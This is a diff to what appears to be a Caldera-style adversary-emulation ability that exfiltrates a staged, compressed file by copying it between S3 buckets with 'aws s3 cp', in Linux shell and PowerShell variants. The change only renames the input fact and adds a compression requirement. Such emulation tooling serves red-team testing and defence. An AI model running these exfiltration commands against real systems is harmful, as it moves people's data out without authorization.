@@ -12,15 +12,18 @@
     linux:
       sh:
         command: |
-          LocalFile='#{host.dir.compress}';
+          LocalFile='#{file.staged_at}';
           RemoteName="exfil-#{paw}-$(basename $LocalFile)";
           aws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;
     windows:
       psh:
         command: |
-          $SourceFile = (Get-Item #{host.dir.compress});
+          $SourceFile = (Get-Item #{file.staged_at});
           $RemoteName = "exfil-#{paw}-$($SourceFile.name)";
           aws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;
   requirements:
     - plugins.stockpile.app.requirements.paw_provenance:
-      - source: host.dir.compress
+      - source: file.staged_at
+    - plugins.stockpile.app.requirements.basic:
+      - source: file.staged_at
+        edge: is_compressed
